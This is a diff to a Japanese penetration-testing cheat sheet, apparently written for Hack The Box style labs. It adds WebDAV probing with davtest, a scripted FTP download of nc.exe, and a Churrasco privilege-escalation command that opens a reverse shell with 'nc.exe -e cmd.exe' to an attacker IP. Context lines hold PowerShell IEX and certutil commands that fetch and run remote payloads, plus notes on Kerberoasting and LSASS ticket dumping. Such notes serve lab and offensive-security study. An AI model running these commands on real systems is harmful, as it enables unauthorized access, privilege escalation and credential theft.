@@ -102,6 +102,8 @@ feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discov
 ## --no-recursion
 feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion | tee feroxbuster.txt
 
+# WevDAVの探索
+/usr/bin/davtest -url http://targethost.htb/
 ```
 
 ### 攻撃ファイル転送
@@ -120,7 +122,9 @@ IEX(New-Object Net.WebClient).downloadstring('http://10.10.10.7:5000/winPEASx64.
 certutil.exe -URLCache -split -f http://10.10.14.3:5000/exploit exploit.exe
 
 # ファイルダウンロード(FTP)
-echo open 10.10.10.3 > ftp.txt && echo user user password >> ftp.txt && echo get exploit exploit.exe >> ftp.txt && echo quit >> ftp.txt
+# FTPでWindowsマシンにバイナリを転送する場合は、binary modeを使わないと実行できないので注意
+# https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files
+echo open 10.10.14.3 > ftp.txt && echo user user password >> ftp.txt && echo binary >> ftp.txt && echo get nc.exe nc.exe >> ftp.txt && echo quit >> ftp.txt
 ftp -n < ftp.txt
 ```
 
@@ -133,6 +137,8 @@ ftp -n < ftp.txt
 - [SecWiki/windows-kernel-exploits: その他エクスプロイト](https://github.com/SecWiki/windows-kernel-exploits)
 - [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 - [windows-binaries | Kali Linux Tools](https://www.kali.org/tools/windows-binaries/)
+- [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
+- [Re4son/Churrasco](https://github.com/Re4son/Churrasco)
 - [ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)
 
 ### リバースシェル
@@ -558,6 +564,22 @@ misc::cmd
 
 - マシンのLSASSメモリからTGTをダンプすることにより、チケットを取得し、偽装することができる。
 - ドメインのSQLサーバーにアクセスしたいが、現在侵害されているユーザーはそのサーバーにアクセスできないとき、そのサービスをkerberoastingすることで、足がかりを得るためのアクセス可能なサービスアカウントを見つけることができる。次に、サービスハッシュをダンプし、TGTになりすまして、KDCからSQLサービスのサービスチケットを要求し、ドメインのSQLにアクセスできるようにする。
+
+### ローカル特権昇格ツール
+
+``` bash
+# ユーザーがSeImpersonateまたはSeAssignPrimaryToken特権を持っている場合、COMサーバを悪用して特権を取得できる場合がある
+
+
+# Victimが古い場合はChurrascoを使う
+churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.10.1 9999"
+```
+
+参考：[GitHub - ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
+
+参考：[GitHub - Re4son/Churrasco: Changes for Visual Studio 2013](https://github.com/Re4son/Churrasco)
+
+参考：[getsystemの中身](https://note.com/lacnote/n/nef29b7c6a94f)
 
 
 
